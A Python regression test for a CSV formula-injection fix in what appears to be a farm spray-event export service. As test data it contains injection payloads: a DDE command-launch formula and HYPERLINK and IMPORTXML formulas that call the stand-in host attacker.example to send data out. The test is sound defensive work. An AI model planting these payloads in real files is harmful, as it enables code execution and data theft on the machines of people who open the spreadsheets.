"""CSV formula-injection neutralisation on the export endpoints.

Regression test for vuln-0002 (Strix scan): a free-text field a grower typed
(`product_name`, `notes`, ...) flows into an exported CSV that a PCA opens in Excel /
Sheets for compliance. A cell beginning with `= + - @` is evaluated as a formula on
open — enabling DDE process launch, or silent exfiltration via HYPERLINK / IMPORTXML.
The export must write such values as inert text, never as a formula.
"""
from datetime import date, timedelta

import csv
import io

from app.main import _sanitise_csv_cell


# ------------------------------------------------------------------ pure helper
def test_formula_triggers_are_prefixed_and_benign_values_are_untouched():
    for trigger in ("=", "+", "-", "@"):
        payload = f"{trigger}cmd|' /C calc'!A0"
        assert _sanitise_csv_cell(payload) == "\t" + payload

    # Ordinary strings pass through unchanged.
    assert _sanitise_csv_cell("Switch 62.5 WG") == "Switch 62.5 WG"
    assert _sanitise_csv_cell("") == ""

    # Non-strings cannot carry formula syntax and must not be mangled — prefixing a
    # number would corrupt a legitimately numeric column.
    assert _sanitise_csv_cell(12) == 12
    assert _sanitise_csv_cell(3.5) == 3.5
    assert _sanitise_csv_cell(None) is None
    assert _sanitise_csv_cell(True) is True


# ------------------------------------------------------------------- end to end
def _farm(client):
    res = client.post("/farms", json={
        "name": "Injection Test Farm", "country": "US", "crop_type": "strawberry",
        "expected_harvest_date": (date.today() + timedelta(days=30)).isoformat(),
    })
    assert res.status_code == 201
    return res.json()


def test_spray_export_neutralises_injected_formulas(client):
    farm = _farm(client)
    hostile = "=cmd|' /C calc'!A0"
    client.post(f"/farms/{farm['id']}/spray-events", json={
        "product_name": hostile,
        "active_ingredient": '+HYPERLINK("http://attacker.example","x")',
        "pesticide_class": "@SUM(1+1)",
        "target_pest_or_disease": "-2+3",
        "application_date": date.today().isoformat(),
        "notes": '=IMPORTXML("http://attacker.example","//")',
    })

    resp = client.get(f"/farms/{farm['id']}/export/spray-events.csv")
    assert resp.status_code == 200

    # Parse it back the way a spreadsheet would, and assert no data cell is a live
    # formula — every hostile value survives, but tab-guarded as text.
    rows = list(csv.reader(io.StringIO(resp.text)))
    header, data = rows[0], rows[1:]
    assert data, "the injected spray event must appear in the export"
    for row in data:
        for cell in row:
            assert cell[:1] not in ("=", "+", "-", "@"), f"live formula in export: {cell!r}"
    # The original value is still present (as text), so the fix neutralises without losing data.
    assert any("\t" + hostile in cell for row in data for cell in row)
